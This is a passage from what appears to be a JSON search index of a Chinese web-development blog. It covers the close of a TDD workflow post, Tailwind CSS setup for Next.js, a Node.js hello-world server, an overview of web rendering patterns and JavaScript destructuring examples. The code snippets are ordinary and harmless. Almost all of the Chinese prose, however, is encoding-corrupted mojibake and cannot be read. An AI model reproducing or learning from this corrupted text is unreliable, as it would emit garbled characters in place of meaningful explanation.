±åŠ¨çš„å®ç°ï¼ˆTDD åŒºåˆ«äº CDDï¼‰ åœ¨è¿™ä¸ªé˜¶æ®µï¼Œè®¾è®¡è¢«åˆ†æˆæ›´å°çš„ä»»åŠ¡ï¼Œåˆ†é…ç»™ä¸åŒçš„å›¢é˜Ÿæˆå‘˜ã€‚è¡Œä¸šæ ‡å‡†æ˜¯ä½¿ç”¨æµ‹è¯•é©±åŠ¨å¼€å‘(TDD) æ–¹æ³•å®ç°åŠŸèƒ½ã€‚\nTDD æœ‰å‡ ä¸ªå¯ä»¥åŠ å¿«æ•´ä½“å¼€å‘å‘¨æœŸçš„å¥½å¤„ï¼š\n1. å¤„ç†æµ‹è¯•ç”¨ä¾‹ï¼ˆç”± QA å›¢é˜Ÿå®šä¹‰ï¼‰ä»¥ç¡®ä¿è¯¥åŠŸèƒ½ç¬¦åˆæ‰€æœ‰è¦æ±‚ã€‚ 2. ä¸ä¼šæ·»åŠ è¶…è¿‡éœ€è¦çš„å†…å®¹ï¼ˆYAGNIåŸåˆ™ï¼‰ã€‚\r3. ç¼–å†™çš„ä»£ç æœ¬è´¨ä¸Šæ˜¯å¯æµ‹è¯•çš„ã€‚å¦åˆ™ï¼Œæ— æ³•å…ˆç¼–å†™æµ‹è¯•ã€‚\r4. ä¸ä¼šæµªè´¹æ—¶é—´æ‰‹åŠ¨æµ‹è¯•ä»£ç ã€‚åœ¨ç§»åŠ¨å¼€å‘ä¸­ï¼Œæ‰‹åŠ¨æµ‹è¯•æ„å‘³ç€ï¼šæ„å»ºåº”ç”¨ç¨‹åºã€å¯åŠ¨æ¨¡æ‹Ÿå™¨ã€åŠ è½½åº”ç”¨ç¨‹åºã€å¯åŠ¨å®ƒã€å¯¼èˆªåˆ°æ­£ç¡®çš„å±å¹•å¹¶æµ‹è¯•å®ƒã€‚æ­¤è¿‡ç¨‹å¯èƒ½éœ€è¦å‡ åˆ†é’Ÿæ—¶é—´ã€‚å•å…ƒæµ‹è¯•éœ€è¦å‡ æ¯«ç§’ã€‚\r5. è·å–ä¸€ä¸ªæµ‹è¯•å¥—ä»¶ï¼Œä»¥é˜²æ­¢ä»£ç å›å½’ã€‚\r6. è·å–æµ‹è¯•ä»£ç çš„æ–‡æ¡£ã€‚ äº”ã€éªŒæ”¶å’Œå‘å¸ƒ è‡³æ­¤ï¼Œè¯¥åŠŸèƒ½å·²ç»å¼€å‘å®Œæˆã€‚\næˆ‘ä»¬éœ€è¦å°†å…¶æäº¤ç»™è´¨é‡ä¿è¯éƒ¨é—¨ä»¥åŠäº§å“å’Œè®¾è®¡å›¢é˜Ÿï¼Œä»¥æŸ¥çœ‹å®ƒæ˜¯å¦é€šè¿‡äº†äººå·¥éªŒæ”¶æ ‡å‡†ã€‚\nè´¨é‡ä¿è¯å›¢é˜Ÿå¸Œæœ›æµ‹è¯•æœ€å…³é”®çš„è·¯å¾„å’Œæ–°åŠŸèƒ½çš„è¡Œä¸ºã€‚\nåŒæ ·ï¼Œè®¾è®¡å’Œäº§å“å›¢é˜Ÿå¸Œæœ›ä»”ç»†æ£€æŸ¥ç”¨æˆ·ä½“éªŒå’Œéœ€æ±‚æ˜¯å¦ç¬¦åˆä»–ä»¬çš„æƒ³æ³•ã€‚\nå±Šæ—¶ï¼Œè¯¥åŠŸèƒ½å·²å‡†å¤‡å¥½å‘å¸ƒç»™æœ€ç»ˆç”¨æˆ·ã€‚\nå…­ã€ç»“è¯­ ä¸ªäººé¡¹ç›®ä¹Ÿå¯ä»¥éµå¾ªæ­¤è¿‡ç¨‹ã€‚æˆ‘ä»¬åº”è¯¥å§‹ç»ˆæ£€æŸ¥åŠŸèƒ½çš„é¢„æœŸå†…å®¹ï¼ŒéªŒè¯å‡è®¾ï¼Œè®¾è®¡é€‚å½“çš„è§£å†³æ–¹æ¡ˆã€‚\nè¿™ä¸ªè¿‡ç¨‹å¯ä»¥èŠ‚çœå¤§é‡æ—¶é—´ï¼Œä¹Ÿå¯ä»¥æœ€å¤§é™åº¦åœ°æé«˜äººä»¬çš„å¹¸ç¦æ„Ÿï¼šå½“ä»–ä»¬å‚ä¸åˆ°é¡¹ç›®ä¸­æ—¶ï¼Œä»–ä»¬ä¼šæ„Ÿåˆ°è¢«å€¾å¬ï¼Œå¹¶ä¸”å¾ˆé‡è¦ã€‚\nè½»æ¾åä½œï¼Œæ‰èƒ½ä¸ºé¡¹ç›®çš„æˆåŠŸç”Ÿæ ¹å‘èŠ½ã€‚è€Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬æ‰€æ¸´æœ›çš„ã€‚\n","description":"å¼€å‘ä»»ä½•åŠŸèƒ½çš„5ä¸ªæ­¥éª¤","id":32,"section":"others","tags":null,"title":"å¦‚ä½•å¼€å‘åŠŸèƒ½å’Œè§£å†³é—®é¢˜","uri":"https://codthing.github.io/others/devmethod/devmethod/"},{"content":"VSCode æ’ä»¶   PostCSS Language Support\n  Tailwind CSS IntelliSense\n  Next.js + TailwindCSS åœ¨ Next.js v10+ é¡¹ç›®ä¸­è®¾ç½® Tailwind CSS\nStep1. åˆ›å»ºé¡¹ç›® 1 2  yarn create next-app --typescript   Step2. å®‰è£…Tailwind CSS tailwindcss é€šè¿‡ yarn å®‰è£…åŠå…¶å¯¹ç­‰ä¾èµ–é¡¹ï¼Œç„¶åè¿è¡Œ â€‹â€‹init å‘½ä»¤ç”Ÿæˆ tailwind.config.js å’Œ postcss.config.js.\n1 2 3 4  yarn add --dev tailwindcss postcss autoprefixer npx tailwindcss init -p   Step3. é…ç½®æ¨¡æ¿è·¯å¾„ åœ¨æ–‡ä»¶ä¸­æ·»åŠ æ‰€æœ‰æ¨¡æ¿æ–‡ä»¶çš„è·¯å¾„ tailwind.config.jsã€‚\n1 2 3 4 5 6 7 8 9 10 11  module.exports = { content: [ \u0026#34;./pages/**/*.{js,ts,jsx,tsx}\u0026#34;, \u0026#34;./components/**/*.{js,ts,jsx,tsx}\u0026#34;, ], theme: { extend: {}, }, plugins: [], }   Step4. å°† Tailwind æŒ‡ä»¤æ·»åŠ åˆ° CSS å°† @tailwindTailwind çš„æ¯ä¸ªå±‚çš„æŒ‡ä»¤æ·»åŠ åˆ°æ–‡ä»¶ä¸­ã€‚ ./styles/globals.css\n1 2 3 4  @tailwind base; @tailwind components; @tailwind utilities;   Step5. å¼€å§‹æ„å»ºè¿‡ç¨‹ 1 2  yarn dev   Step6. å¼€å§‹åœ¨é¡¹ç›®ä¸­ä½¿ç”¨ Tailwind å¼€å§‹ä½¿ç”¨ Tailwind çš„å®ç”¨ç¨‹åºç±»æ¥è®¾è®¡å†…å®¹ã€‚\n1 2 3 4 5 6 7 8  export default function Home() { return ( \u0026lt;h1 className=\u0026#34;text-3xl font-bold underline\u0026#34;\u0026gt; Hello world! \u0026lt;/h1\u0026gt; ) }   ","description":"","id":33,"section":"react","tags":null,"title":"å®‰è£…","uri":"https://codthing.github.io/react/tailwindcss/tailwindcss-start.md/tailwindcss-install/"},{"content":"Node.js ç®€ä»‹ Node.js æ˜¯ä¸€ä¸ªå¼€æºçš„è·¨å¹³å° JavaScript è¿è¡Œæ—¶ç¯å¢ƒã€‚\nNode.js åœ¨æµè§ˆå™¨ä¹‹å¤–è¿è¡Œ V8 JavaScript å¼•æ“ï¼Œå®ƒæ˜¯ Google Chrome çš„æ ¸å¿ƒã€‚\nNode.js åº”ç”¨ç¨‹åºåœ¨å•ä¸ªè¿›ç¨‹ä¸­è¿è¡Œï¼Œæ— éœ€ä¸ºæ¯ä¸ªè¯·æ±‚åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ã€‚Node.js åœ¨å…¶æ ‡å‡†åº“ä¸­æä¾›äº†ä¸€ç»„å¼‚æ­¥ I/O åŸè¯­ï¼Œä»¥é˜²æ­¢ JavaScript ä»£ç é˜»å¡ï¼Œé€šå¸¸ï¼ŒNode.js ä¸­çš„åº“æ˜¯ä½¿ç”¨éé˜»å¡èŒƒå¼ç¼–å†™çš„ï¼Œä½¿å¾—é˜»å¡è¡Œä¸ºæˆä¸ºä¾‹å¤–è€Œä¸æ˜¯å¸¸æ€ã€‚\næ„å»º Node.js åº”ç”¨ç¨‹åºï¼ˆwebæœåŠ¡å™¨ï¼‰ Step1. åˆ›å»ºä¸€ä¸ªé¡¹ç›®ç›®å½• 1 2  mkdir node-webserver \u0026amp;\u0026amp; cd node-webserver   Step2. ç¼–è¾‘ä¸€ä¸ªserveræœåŠ¡å™¨ä¸»æ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  // app.js const http = require(\u0026#39;http\u0026#39;); const hostname = \u0026#39;127.0.0.1\u0026#39;; const port = 3000; const server = http.createServer((req, res) =\u0026gt; { res.statusCode = 200; res.setHeader(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/plain\u0026#39;); res.end(\u0026#39;Hello World\u0026#39;); }); server.listen(port, hostname, () =\u0026gt; { console.log(`Server running at http://${hostname}:${port}/`); });    å¯¼å…¥ Node.js httpæ¨¡å— http çš„ createServer() æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°çš„ HTTP æœåŠ¡å™¨ æ¯å½“æ¥æ”¶åˆ°æ–°è¯·æ±‚æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨ requestäº‹ä»¶ï¼Œæä¾›ä¸¤ä¸ªå¯¹è±¡ï¼šè¯·æ±‚ å’Œ å“åº” æœåŠ¡å™¨è®¾ç½®ä¸ºä¾¦å¬æŒ‡å®šçš„ç«¯å£å’Œä¸»æœºåã€‚å½“æœåŠ¡å™¨å‡†å¤‡å¥½æ—¶ï¼Œå›è°ƒå‡½æ•°è¢«è°ƒç”¨ï¼Œé€šçŸ¥æˆ‘ä»¬æœåŠ¡å™¨æ­£åœ¨è¿è¡Œ å°† statusCode å±æ€§ è®¾ç½®ä¸º 200ï¼Œä»¥æŒ‡ç¤ºæˆåŠŸå“åº” è®¾ç½® Content-Type æ ‡å¤´ å…³é—­ å“åº”ï¼Œå°†å†…å®¹ä½œä¸ºå‚æ•°æ·»åŠ åˆ° end()  Step3. å¯åŠ¨æœåŠ¡å™¨ 1 2  node app.js   Node.js æ¡†æ¶å’Œå·¥å…· Socket.io åŒå‘å’Œä½å»¶è¿Ÿé€šä¿¡\nAdonisJS åŸºäº TypeScript çš„å…¨åŠŸèƒ½æ¡†æ¶\nï¼ˆæˆ‘ä¸ªäººè§‰å¾—å¾ˆæ£’ï¼Œå•çœ‹æ–‡æ¡£ç»“æ„å°±çŸ¥é“å¦‚ä½•å®æ–½æœåŠ¡ç«¯äº†ï¼Œéå¸¸ç›´è§‚ã€‚è™½ç„¶å…³æ³¨åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œä½†æ˜¯å¥½ç”¨æ‰æ˜¯çœŸç†ï¼‰\nLoopback.io ä¸€ä¸ªé«˜åº¦å¯æ‰©å±•çš„ Node.js å’Œ TypeScript æ¡†æ¶ç”¨äºæ„å»º API å’Œå¾®æœåŠ¡ã€‚\nStrapi çµæ´»çš„å¼€æº Headless CMSï¼Œå®ƒè®©å¼€å‘äººå‘˜å¯ä»¥è‡ªç”±é€‰æ‹©ä»–ä»¬å–œæ¬¢çš„å·¥å…·å’Œæ¡†æ¶ï¼ŒåŒæ—¶è¿˜å…è®¸ç¼–è¾‘äººå‘˜è½»æ¾ç®¡ç†å’Œåˆ†å‘ä»–ä»¬çš„å†…å®¹ã€‚\né€šè¿‡æ’ä»¶ç³»ç»Ÿä½¿ç®¡ç†é¢æ¿å’Œ API å¯æ‰©å±•ï¼ŒStrapi ä½¿ä¸–ç•Œä¸Šæœ€å¤§çš„å…¬å¸èƒ½å¤Ÿåœ¨æ„å»ºç²¾ç¾çš„æ•°å­—ä½“éªŒçš„åŒæ—¶åŠ é€Ÿå†…å®¹äº¤ä»˜ã€‚\nNext.js Reactæ¡†æ¶ï¼Œæä¾›ç”Ÿäº§æ‰€éœ€çš„æ‰€æœ‰åŠŸèƒ½çš„æœ€ä½³å¼€å‘äººå‘˜ä½“éªŒï¼šæ··åˆé™æ€å’ŒæœåŠ¡å™¨æ¸²æŸ“ã€TypeScript æ”¯æŒã€æ™ºèƒ½æ†ç»‘ã€è·¯ç”±é¢„å–ç­‰ã€‚\nqiankun å¾®å‰ç«¯çš„å¿«é€Ÿã€ç®€å•å’Œå®Œæ•´çš„è§£å†³æ–¹æ¡ˆã€‚\nsingle-spa ç”¨äºè½»æ¾å¾®å‰ç«¯çš„è·¯ç”±å™¨ã€‚æ˜¯qiankunçš„é¼»ç¥–\n","description":"å¿«é€Ÿå¼€å§‹","id":34,"section":"nodejs","tags":null,"title":"å¿«é€Ÿå¼€å§‹","uri":"https://codthing.github.io/nodejs/nodebase/node-start/"},{"content":"ä»‹ç» å¦‚ä»Šï¼Œå¯ä»¥é€šè¿‡å¤šç§æ–¹å¼åœ¨ Web ä¸Šå‘ˆç°å†…å®¹ã€‚\nå¦‚ä½•ä»¥åŠåœ¨ä½•å¤„è·å–å’Œå‘ˆç°å†…å®¹çš„å†³å®šæ˜¯åº”ç”¨ç¨‹åºæ€§èƒ½çš„å…³é”®ã€‚\nå¯ç”¨çš„æ¡†æ¶å’Œåº“å¯ç”¨äºå®ç°ä¸åŒçš„æ¸²æŸ“æ¨¡å¼ï¼Œå¦‚å®¢æˆ·ç«¯æ¸²æŸ“ã€é™æ€æ¸²æŸ“ã€æ°´åŒ–ã€æ¸è¿›å¼æ¸²æŸ“å’ŒæœåŠ¡å™¨ç«¯æ¸²æŸ“ã€‚\nåœ¨æˆ‘ä»¬å†³å®šå“ªç§æ¨¡å¼æœ€é€‚åˆæˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¹‹å‰ï¼Œäº†è§£æ¯ç§æ¨¡å¼çš„å«ä¹‰å¾ˆé‡è¦ã€‚\nChrome å›¢é˜Ÿé¼“åŠ±å¼€å‘äººå‘˜è€ƒè™‘é™æ€æ¸²æŸ“æˆ–æœåŠ¡å™¨ç«¯æ¸²æŸ“ï¼Œè€Œä¸æ˜¯å®Œå…¨é‡æ–°æ°´åŒ–çš„æ–¹æ³•ã€‚\néšç€æ—¶é—´çš„æ¨ç§»ï¼Œé»˜è®¤æƒ…å†µä¸‹çš„æ¸è¿›å¼åŠ è½½å’Œæ¸²æŸ“æŠ€æœ¯å¯èƒ½æœ‰åŠ©äºåœ¨ä½¿ç”¨ç°ä»£æ¡†æ¶æ—¶åœ¨æ€§èƒ½å’ŒåŠŸèƒ½äº¤ä»˜ä¹‹é—´å–å¾—è‰¯å¥½çš„å¹³è¡¡\nä»¥ä¸‹éƒ¨åˆ†å°†æä¾›æœ‰å…³è¡¡é‡åº”ç”¨ç¨‹åºåœ¨ Web æ¸²æŸ“æ–¹é¢çš„æ€§èƒ½è¦æ±‚çš„æŒ‡å—ï¼Œå¹¶å»ºè®®æœ€èƒ½æ»¡è¶³è¿™äº›è¦æ±‚çš„æ¨¡å¼ã€‚\néšåï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨æ¯ç§æ¨¡å¼å¹¶äº†è§£å¦‚ä½•å®æ–½ã€‚\næˆ‘ä»¬è¿˜å°†è®¨è®ºå¯ç”¨äºå®ç°è¿™äº›æ¨¡å¼çš„ Next.jsã€‚\nç„¶è€Œï¼Œåœ¨æˆ‘ä»¬è¿›å…¥å¯ç”¨çš„æ¨¡å¼æˆ– Next.js ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦‚ä½•åˆ°è¾¾è¿™é‡Œçš„ï¼Œä»¥åŠå¯¼è‡´ React æ¡†æ¶å’Œ Next.js åˆ›å»ºçš„é©±åŠ¨å› ç´ æ˜¯ä»€ä¹ˆã€‚\n\rWeb æ¸²æŸ“ç®€å² Web æŠ€æœ¯ä¸€ç›´åœ¨ä¸æ–­å‘å±•ä»¥æ”¯æŒä¸æ–­å˜åŒ–çš„åº”ç”¨ç¨‹åºéœ€æ±‚ã€‚\næ‰€æœ‰ç½‘ç«™çš„æ„å»ºå— HTMLã€CSS å’Œ JavaScript ä¹Ÿéšç€æ—¶é—´çš„æ¨ç§»è€Œå‘å±•ï¼Œä»¥æ”¯æŒä¸æ–­å˜åŒ–çš„éœ€æ±‚å¹¶åˆ©ç”¨æµè§ˆå™¨çš„è¿›æ­¥ã€‚\nåœ¨ 2000 å¹´ä»£åˆæœŸï¼Œæˆ‘ä»¬æœ‰ä¸€äº›ç½‘ç«™ï¼Œå…¶ä¸­ HTML å†…å®¹å®Œå…¨ç”±æœåŠ¡å™¨å‘ˆç°ã€‚\nå¼€å‘äººå‘˜ä¾é æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€ï¼ˆå¦‚ PHP å’Œ ASPï¼‰æ¥å‘ˆç° HTMLã€‚\næ‰€æœ‰å…³é”®å¯¼èˆªéƒ½éœ€è¦é‡æ–°åŠ è½½é¡µé¢ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯æœ€å¤šä½¿ç”¨ JavaScript æ¥éšè—/æ˜¾ç¤ºæˆ–å¯ç”¨/ç¦ç”¨ HTML å…ƒç´ ã€‚\n2006 å¹´ï¼ŒAjax å¼•å…¥äº†å•é¡µåº”ç”¨ç¨‹åº (SPA) çš„å¯èƒ½æ€§ï¼ŒGmail æ˜¯æœ€æµè¡Œçš„ä¾‹å­ã€‚ Ajax å…è®¸å¼€å‘äººå‘˜åœ¨ä¸åŠ è½½æ–°é¡µé¢çš„æƒ…å†µä¸‹å‘æœåŠ¡å™¨å‘å‡ºåŠ¨æ€è¯·æ±‚ã€‚\nå› æ­¤ï¼Œå¯ä»¥å°† SPA æ„å»ºä¸ºç±»ä¼¼äºæ¡Œé¢åº”ç”¨ç¨‹åºã€‚\nå¾ˆå¿«ï¼Œå¼€å‘äººå‘˜å¼€å§‹ä½¿ç”¨ JavaScript æ¥è·å–å’Œå‘ˆç°æ•°æ®ã€‚åˆ›å»ºäº†å¯ç”¨äºåœ¨ MVC æ¡†æ¶ä¸­æ„å»ºè§†å›¾å±‚åŠŸèƒ½çš„ JavaScript åº“å’Œæ¡†æ¶ã€‚ JQueryã€Backbone.js å’Œ AngularJS ç­‰å®¢æˆ·ç«¯æ¡†æ¶ä½¿å¼€å‘äººå‘˜å¯ä»¥æ›´è½»æ¾åœ°ä½¿ç”¨ JavaScript æ„å»ºæ ¸å¿ƒåŠŸèƒ½ã€‚\nReact äº 2013 å¹´æ¨å‡ºï¼Œä½œä¸ºæ„å»ºç”¨æˆ·ç•Œé¢å’Œ UI ç»„ä»¶çš„çµæ´»æ¡†æ¶ï¼Œå¹¶ä¸ºå¼€å‘å•é¡µ Web å’Œç§»åŠ¨åº”ç”¨ç¨‹åºæä¾›äº†åŸºç¡€ã€‚\nä» 2015 å¹´åˆ° 2020 å¹´ï¼ŒReact ç”Ÿæ€ç³»ç»Ÿå·²ç»å‘å±•åˆ°åŒ…æ‹¬æ”¯æŒæ•°æ®æµæ¶æ„åº“ï¼ˆReduxï¼‰ã€CSS æ¡†æ¶ï¼ˆReact-Bootstrapï¼‰ã€è·¯ç”±åº“å’Œç§»åŠ¨åº”ç”¨ç¨‹åºæ¡†æ¶ï¼ˆReact Nativeï¼‰ã€‚\nä½†æ˜¯ï¼Œçº¯å®¢æˆ·ç«¯æ¸²æŸ“æ¡†æ¶å­˜åœ¨ä¸€äº›ç¼ºç‚¹ã€‚å› æ­¤ï¼Œå¼€å‘äººå‘˜å¼€å§‹æ¢ç´¢æ–°çš„æ–¹æ³•æ¥å……åˆ†åˆ©ç”¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯æ¸²æŸ“ä¸–ç•Œã€‚\næ¸²æŸ“ - å…³é”®æ€§èƒ½æŒ‡æ ‡ åœ¨è®¨è®ºç¼ºç‚¹ä¹‹å‰ï¼Œè®©æˆ‘ä»¬äº†è§£å¦‚ä½•è¡¡é‡æ¸²æŸ“æœºåˆ¶çš„æ€§èƒ½ã€‚\nå¯¹ä»¥ä¸‹æœ¯è¯­çš„åŸºæœ¬ç†è§£å°†æœ‰åŠ©äºæˆ‘ä»¬æ¯”è¾ƒæ­¤å¤„è®¨è®ºçš„ä¸åŒæ¨¡å¼ã€‚\n   å…³é”®è¯ æè¿°     TTFB Time to First Byte - å•å‡»é“¾æ¥å’Œç¬¬ä¸€ä¸ªå†…å®¹è¿›å…¥ä¹‹é—´çš„æ—¶é—´   FP First Paint - ç¬¬ä¸€æ¬¡ç»˜åˆ¶ - ç”¨æˆ·ç¬¬ä¸€æ¬¡çœ‹åˆ°ä»»ä½•å†…å®¹æˆ–åœ¨å±å¹•ä¸Šç»˜åˆ¶å‰å‡ ä¸ªåƒç´ çš„æ—¶é—´   FCP First Contentful Paint - æ‰€æœ‰è¯·æ±‚çš„å†…å®¹å˜ä¸ºå¯è§çš„æ—¶é—´   LCP Largest Contentful Paint - æœ€å¤§çš„å†…å®¹ç»˜åˆ¶ - ä¸»é¡µå†…å®¹å˜å¾—å¯è§çš„æ—¶é—´ã€‚ è¿™æ˜¯æŒ‡åœ¨è§†å£å†…å¯è§çš„æœ€å¤§å›¾åƒæˆ–æ–‡æœ¬å—   TTI å¯äº¤äº’æ—¶é—´ - é¡µé¢å˜ä¸ºå¯äº¤äº’çš„æ—¶é—´ï¼Œä¾‹å¦‚ï¼Œäº‹ä»¶å·²è¿æ¥ç­‰   TBT æ€»é˜»å¡æ—¶é—´ - FCP å’Œ TTI ä¹‹é—´çš„æ€»æ—¶é—´é‡    å…³äºè¿™äº›æ€§èƒ½å‚æ•°çš„ä¸€äº›é‡è¦è¯´æ˜å¦‚ä¸‹ã€‚\n  å¤§å‹ JavaScript åŒ…å¯èƒ½ä¼šå¢åŠ é¡µé¢åˆ°è¾¾ FCP å’Œ LCP æ‰€éœ€çš„æ—¶é—´ã€‚ ç”¨æˆ·å°†éœ€è¦ç­‰å¾…ä¸€æ®µæ—¶é—´æ‰èƒ½ä»å¤§éƒ¨åˆ†ç©ºç™½é¡µé¢è½¬åˆ°åŠ è½½äº†å†…å®¹çš„é¡µé¢ã€‚\n  è¾ƒå¤§çš„ JavaScript åŒ…ä¹Ÿä¼šå½±å“ TTI å’Œ TBTï¼Œå› ä¸ºåªæœ‰åœ¨åŠ è½½äº†æœ€å°‘çš„ JavaScript å¹¶è¿æ¥äº†äº‹ä»¶åï¼Œé¡µé¢æ‰èƒ½å˜å¾—å¯äº¤äº’ã€‚\n  å†…å®¹çš„ç¬¬ä¸€ä¸ªå­—èŠ‚åˆ°è¾¾æµè§ˆå™¨ (TTFB) æ‰€éœ€çš„æ—¶é—´å–å†³äºæœåŠ¡å™¨å¤„ç†è¯·æ±‚æ‰€ç”¨çš„æ—¶é—´ã€‚\n  preloadã€prefetch å’Œ script å±æ€§ç­‰æŠ€æœ¯ä¼šå½±å“ä¸Šè¿°å‚æ•°ï¼Œå› ä¸ºä¸åŒçš„æµè§ˆå™¨å¯¹å®ƒä»¬çš„è§£é‡Šä¸åŒã€‚ åœ¨ä½¿ç”¨è¿™äº›å±æ€§ä¹‹å‰ï¼Œäº†è§£æµè§ˆå™¨ä¸ºè¿™äº›å±æ€§åˆ†é…çš„åŠ è½½å’Œæ‰§è¡Œä¼˜å…ˆçº§ä¼šå¾ˆæœ‰å¸®åŠ©ã€‚\n  æˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨è¿™äº›å‚æ•°æ¥äº†è§£æ¯ç§æ¨¡å¼åœ¨æ¸²æŸ“è¦æ±‚æ–¹é¢å¿…é¡»æä¾›ä»€ä¹ˆã€‚\n\ræ¨¡å¼ - å¿«é€Ÿæµè§ˆ å®¢æˆ·ç«¯æ¸²æŸ“ (CSR) å’ŒæœåŠ¡å™¨ç«¯æ¸²æŸ“ (SSR) å½¢æˆäº†å¯ç”¨äºæ¸²æŸ“çš„é€‰æ‹©èŒƒå›´çš„ä¸¤ä¸ªæç«¯ã€‚\nä¸‹å›¾ä¸­åˆ—å‡ºçš„å…¶ä»–æ¨¡å¼ä½¿ç”¨ä¸åŒçš„æ–¹æ³•æ¥æä¾›ä» CSR å’Œ SSR å€Ÿç”¨çš„æŸäº›åŠŸèƒ½ç»„åˆã€‚\næ°æ£®Â·ç±³å‹’æ’å›¾\næˆ‘ä»¬å°†è¯¦ç»†æ¢è®¨è¿™äº›æ¨¡å¼ä¸­çš„æ¯ä¸€ä¸ªã€‚\nç„¶è€Œï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œè®©æˆ‘ä»¬è°ˆè°ˆ Next.jsï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºäº React çš„æ¡†æ¶ã€‚\nNext.js ä¸æˆ‘ä»¬çš„è®¨è®ºç›¸å…³ï¼Œå› ä¸ºå®ƒå¯ç”¨äºå®ç°ä»¥ä¸‹æ‰€æœ‰æ¨¡å¼ã€‚\n SSR Static SSR (å®éªŒæ ‡å¿—) SSR with Rehydration å¸¦è¡¥æ°´çš„ SSR CSR with Prerendering also known as Automatic Static Optimization å¸¦æœ‰é¢„æ¸²æŸ“çš„ CSR ä¹Ÿç§°ä¸ºè‡ªåŠ¨é™æ€ä¼˜åŒ– Full CSR  \rç»“è®º æˆ‘ä»¬ç°åœ¨å·²ç»ä»‹ç»äº†å››ç§æœ¬è´¨ä¸Šæ˜¯ SSR å˜ä½“çš„æ¨¡å¼ã€‚\nè¿™äº›å˜åŒ–ä½¿ç”¨æŠ€æœ¯ç»„åˆæ¥é™ä½ä¸€ä¸ªæˆ–å¤šä¸ªæ€§èƒ½å‚æ•°ï¼Œ\nå¦‚ TTFBï¼ˆé™æ€å’Œå¢é‡é™æ€ç”Ÿæˆï¼‰ã€TTIï¼ˆæ¸è¿›å¼æ°´åŒ–ï¼‰å’Œ FCP/FPï¼ˆæµåª’ä½“ï¼‰ã€‚\nè¿™äº›æ¨¡å¼å»ºç«‹åœ¨ç°æœ‰çš„å®¢æˆ·ç«¯æ¡†æ¶ï¼ˆå¦‚ Reactï¼‰ä¹‹ä¸Šï¼Œå¹¶å…è®¸è¿›è¡ŒæŸç§è¡¥å……ä»¥å®ç° CSR çš„äº¤äº’çº§åˆ«ã€‚\nå› æ­¤ï¼Œæˆ‘ä»¬æœ‰å¤šç§é€‰æ‹©æ¥å®ç°ç»“åˆ SSR å’Œ CSR åˆ©ç›Šçš„æœ€å¤§åŒ–ã€‚\n\ræ¦‚æ‹¬ æ ¹æ®åº”ç”¨ç¨‹åºçš„ç±»å‹æˆ–é¡µé¢ç±»å‹ï¼ŒæŸäº›æ¨¡å¼å¯èƒ½æ¯”å…¶ä»–æ¨¡å¼æ›´åˆé€‚ã€‚\nä¸‹å›¾é‡æ–°å®¡è§†ã€æ€»ç»“å’Œæ¯”è¾ƒäº†æˆ‘ä»¬åœ¨å‰å‡ èŠ‚ä¸­è®¨è®ºçš„æ¯ä¸ªæ¨¡å¼çš„äº®ç‚¹ï¼Œå¹¶ä¸ºæ¯ä¸ªæ¨¡å¼æä¾›äº†ç”¨ä¾‹ã€‚\n\rçŸ¥è¯†ç‚¹  TTFB FP FCP LCP TTI TBT ajax next.js SSR Static SSR SSR with hydration CSR Full CSR  ","description":"å¦‚ä½•ä»¥åŠåœ¨ä½•å¤„è·å–å’Œå‘ˆç°å†…å®¹çš„å†³å®šæ˜¯åº”ç”¨ç¨‹åºæ€§èƒ½çš„å…³é”®","id":35,"section":"react-patterns","tags":null,"title":"æ¸²æŸ“æ¨¡å¼ä»‹ç»","uri":"https://codthing.github.io/react-patterns/render-patterns/render-patterns-base/"},{"content":"1. å¿½ç•¥å€¼ 1 2 3  const [apple, , banana] = [\u0026#39;apple\u0026#39;, \u0026#39;pear\u0026#39;, \u0026#39;banana\u0026#39;]; console.log(apple, banana); // apple banana   2. åˆ†é…å‰©ä½™å€¼ 1 2 3 4 5 6  const [one, two, ...remainingNum] = [1, 2, 3, 4, 5]; console.log(remainingNum); // [3, 4, 5]  const { apple, pear, ...remainFruits } = { apple:\u0026#39;apple\u0026#39;, pear:\u0026#39;pear\u0026#39;, banana:\u0026#39;banana\u0026#39;, cherry:\u0026#39;cherry\u0026#39; }; console.log(remainFruits); // { banana:\u0026#39;banana\u0026#39;, cherry:\u0026#39;cherry\u0026#39; }   3. ç»„åˆçš„æ•°ç»„å’Œå¯¹è±¡ - è§£æ„ 1 2 3  const [, , { name }] = [{id:1, name:\u0026#39;apple\u0026#39;}, {id:2, name:\u0026#39;pear\u0026#39;}, {id:3, name:\u0026#39;banana\u0026#39;}]; console.log(name); // banana   4. äº¤æ¢æ•°ç»„ä¸­çš„å˜é‡ 1 2 3  const fruits = [\u0026#39;apple\u0026#39;, \u0026#39;pear\u0026#39;, \u0026#39;banana\u0026#39;]; [fruits[2], fruits[1]] = [fruits[1], fruits[2]];   5. é‡å‘½åå˜é‡ 1 2 3  const { apple, pear, bUNana: banana } = { apple:\u0026#39;apple\u0026#39;, pear:\u0026#39;pear\u0026#39;, bUNana:\u0026#39;banana\u0026#39; }; console.log(banana); // banana   6. è®¾ç½®é»˜è®¤å€¼ 1 2 3 4 5 6  const { banana = \u0026#39;banana\u0026#39;, apple } = { banana:undefined, apple:\u0026#39;apple\u0026#39; }; console.log(banana); // banana  const [one, two, three = 3] = [1, 2, undefined]; console.log(three); // 3   7. åµŒå¥—ç»“æ„ 1 2 3 4 5 6  const { banana, fruitList: [{ apple: nestedApple }] } = { banana: \u0026#39;banana\u0026#39;, fruitList: [{ apple: \u0026#39;apple\u0026#39; }, { pear: \u0026#39;pear\u0026#39; }] }; console.log(nestedApple); // apple   8. åŠ¨æ€å¯¹è±¡é”® 1 2 3 4 5  const fruits = {banana:\u0026#39;banana\u0026#39;, cherry: 